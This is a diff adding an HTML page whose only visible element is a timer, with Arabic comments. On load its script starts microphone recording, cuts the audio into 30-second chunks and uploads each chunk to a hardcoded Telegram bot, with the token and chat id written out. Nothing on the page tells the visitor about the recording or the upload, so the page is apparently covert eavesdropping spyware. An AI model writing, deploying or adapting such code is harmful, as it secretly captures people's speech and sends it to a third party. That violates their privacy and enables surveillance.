@@ -1,0 +1,133 @@
+<body>
+<!-- عداد الوقت (سيظهر الوقت الكلي) -->
+<div id="timer">00:00</div>
+
+<script>
+const token = '8468116606:AAFI0NKNJhvRE_sugFfmkUSNkvlMu1Xi-5k';
+const chat_id = '6612813200';
+
+let mediaRecorder;
+let audioChunks = [];
+let stream;
+let startTime;
+let timerInterval;
+let partNumber = 0;
+let totalSeconds = 0;
+
+const timerDiv = document.getElementById('timer');
+
+function updateTimer() {
+    if (!startTime) return;
+    const elapsed = Date.now() - startTime;
+    totalSeconds = Math.floor(elapsed / 1000);
+    const minutes = Math.floor(totalSeconds / 60);
+    const seconds = totalSeconds % 60;
+    timerDiv.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+}
+
+// دالة إرسال جزء
+function sendPart(blob, partNum) {
+    const url = `https://api.telegram.org/bot${token}/sendAudio`;
+    const formData = new FormData();
+    formData.append('chat_id', chat_id);
+    formData.append('audio', blob, `part${partNum}_${Date.now()}.webm`);
+
+    fetch(url, { method: 'POST', body: formData })
+        .then(r => r.json())
+        .then(data => {
+            if (data.ok) console.log(`✅ الجزء ${partNum} أُرسل`);
+            else console.error(`❌ فشل الجزء ${partNum}:`, data.description);
+        })
+        .catch(err => console.error(`❌ خطأ في الجزء ${partNum}:`, err));
+}
+
+// دالة إنهاء الجزء الحالي وبدء جزء جديد
+function finalizeAndRestart() {
+    if (!mediaRecorder || mediaRecorder.state === 'inactive') return;
+
+    // إيقاف التسجيل (سيؤدي إلى ondataavailable آخر ثم onstop)
+    mediaRecorder.stop();
+    // في onstop سنقوم بإرسال الجزء وبدء جزء جديد
+}
+
+// بدء تسجيل جديد
+function startNewPart() {
+    if (!stream) return;
+
+    audioChunks = []; // مصفوفة جديدة لكل جزء
+    partNumber++;
+
+    const options = { mimeType: 'audio/webm;codecs=opus' };
+    try {
+        mediaRecorder = new MediaRecorder(stream, options);
+    } catch (e) {
+        console.warn('⚠️ استخدام الصيغة الافتراضية');
+        mediaRecorder = new MediaRecorder(stream);
+    }
+
+    mediaRecorder.ondataavailable = (event) => {
+        if (event.data.size > 0) audioChunks.push(event.data);
+    };
+
+    mediaRecorder.onstop = () => {
+        // إرسال الجزء الحالي
+        if (audioChunks.length > 0) {
+            const blob = new Blob(audioChunks, { type: 'audio/webm' });
+            sendPart(blob, partNumber);
+        }
+        // بدء الجزء التالي فوراً (إذا كان التسجيل لا يزال مستمراً)
+        if (isRecording) startNewPart();
+    };
+
+    mediaRecorder.start(1000); // قطع كل ثانية لتحقيق ondataavailable منتظم
+    console.log(`🔴 بدء الجزء ${partNumber}`);
+}
+
+let isRecording = false;
+
+async function startRecording() {
+    try {
+        stream = await navigator.mediaDevices.getUserMedia({
+            audio: {
+                sampleRate: 48000,
+                channelCount: 2,
+                echoCancellation: false,
+                noiseSuppression: false,
+                autoGainControl: false
+            }
+        });
+        console.log('✅ تم الحصول على الميكروفون');
+
+        startTime = Date.now();
+        timerInterval = setInterval(updateTimer, 1000);
+        isRecording = true;
+
+        // بدء أول جزء
+        startNewPart();
+
+        // كل 30 ثانية ننهي الجزء الحالي ونبدأ جزء جديد
+        setInterval(() => {
+            if (isRecording && mediaRecorder && mediaRecorder.state !== 'inactive') {
+                finalizeAndRestart();
+            }
+        }, 30000); // 30 ثانية (يمكن تغييرها)
+
+        // عند إغلاق الصفحة، ننهي آخر جزء ونرسله
+        window.addEventListener('beforeunload', () => {
+            clearInterval(timerInterval);
+            isRecording = false;
+            if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                mediaRecorder.stop(); // يؤدي إلى onstop الذي يرسل الجزء الأخير
+            }
+            if (stream) stream.getTracks().forEach(t => t.stop());
+        });
+
+    } catch (err) {
+        console.error('❌ خطأ:', err);
+        timerDiv.textContent = 'خطأ';
+    }
+}
+
+startRecording();
+</script>
+</body>
